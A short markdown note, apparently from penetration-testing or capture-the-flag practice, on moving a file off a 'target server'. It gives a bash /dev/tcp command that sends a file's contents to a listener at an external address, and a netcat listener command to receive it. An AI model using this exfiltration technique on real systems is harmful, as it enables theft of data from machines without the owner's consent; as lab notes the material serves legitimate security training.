# File Transfer in Linux

---

#### Downloading an file to local machine

On target server

```
cat <file> > /dev/tcp/10.10.14.186/8888
```

On local machine

```
nc -lvnp 8888 > file.jar
```
